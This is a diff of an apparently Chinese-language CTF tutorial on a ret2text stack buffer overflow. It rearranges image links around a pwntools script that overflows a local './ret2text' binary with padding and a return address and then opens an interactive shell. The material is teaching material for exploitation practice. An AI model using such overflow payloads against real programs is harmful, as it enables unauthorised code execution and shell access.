@@ -109,11 +109,14 @@ void get_shell() {
 
 ![](img/14f8144c37a015ef90052a3ad22fbb9f_20.png)
 
-```python
-from pwn import *
 
 ![](img/14f8144c37a015ef90052a3ad22fbb9f_21.png)
 
+
+![](img/14f8144c37a015ef90052a3ad22fbb9f_23.png)
+
+```python
+from pwn import *
 # 设置目标程序
 p = process('./ret2text')
 
@@ -124,9 +127,6 @@ payload = b'A' * offset + p64(target_address)
 
 # 发送payload
 p.send(payload)
-
-![](img/14f8144c37a015ef90052a3ad22fbb9f_23.png)
-
 # 切换到交互模式，获得shell
 p.interactive()
 ```
